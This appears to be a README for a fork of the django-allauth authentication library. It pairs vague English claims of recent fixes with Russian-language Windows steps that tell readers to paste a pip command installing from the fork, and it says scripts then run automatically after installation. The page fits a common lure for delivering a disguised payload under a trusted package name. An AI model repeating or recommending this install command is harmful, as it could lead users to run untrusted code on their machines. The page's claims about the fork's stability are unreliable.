**DigitalSealDecoder/django-allauth**

Hey there! If you are looking for a reliable way to handle authentication, registration, and social accounts in your Django projects, you are in the right place. We've recently rolled out a handful of fixes to iron out the kinks, making the codebase smoother and more stable than ever. Plus, if you're developing on Windows, you can breathe easy—setting everything up on your machine is a total breeze.

**Quick install (Windows)**

1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
2. Открой **cmd** (Win+R → `cmd`)
3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**

```bash
pip install git+https://github.com/DigitalSealDecoder/django-allauth.git
```
